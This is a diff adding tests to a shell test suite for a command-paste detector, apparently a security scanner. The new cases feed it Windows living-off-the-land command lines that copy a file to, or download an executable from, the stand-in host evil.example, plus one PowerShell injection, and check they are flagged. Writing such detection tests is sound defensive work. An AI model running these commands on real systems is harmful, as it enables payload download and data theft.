@@ -11671,6 +11671,21 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-198: paste LOLBin — esentutl/desktopimgdownldr/syncappv ─
+for c in 'esentutl /y c:\a.txt /d \\evil.example\s\a.txt' \
+         'desktopimgdownldr /lockscreenurl:http://evil.example/x.exe /eventName:x' \
+         'syncappvpublishingserver n";iex'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+        && check "paste LOLBin flagged: ${c%% *}" "0" "0" \
+        || check "paste LOLBin flagged: ${c%% *}" "0" "1"
+done
+./hlse_core paste 'syncappvpublishingserver "v"' 2>&1 | head -1 | grep -q "OK" \
+    && check "paste FP guard: syncappv benign clean" "0" "0" \
+    || check "paste FP guard: syncappv benign clean" "0" "1"
+./hlse_core paste 'esentutl /r c:\db' 2>&1 | head -1 | grep -q "OK" \
+    && check "paste FP guard: esentutl repair clean" "0" "0" \
+    || check "paste FP guard: esentutl repair clean" "0" "1"
+
 # ── cycle-197: b64url audit sweep — IGQVJ prefix fix ─────────────
 ./hlse_core secret 'k: IGQVJa1_b2-c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2' 2>&1 | grep -q "Instagram" \
     && check "secret: IGQVJ flagged" "0" "0" \
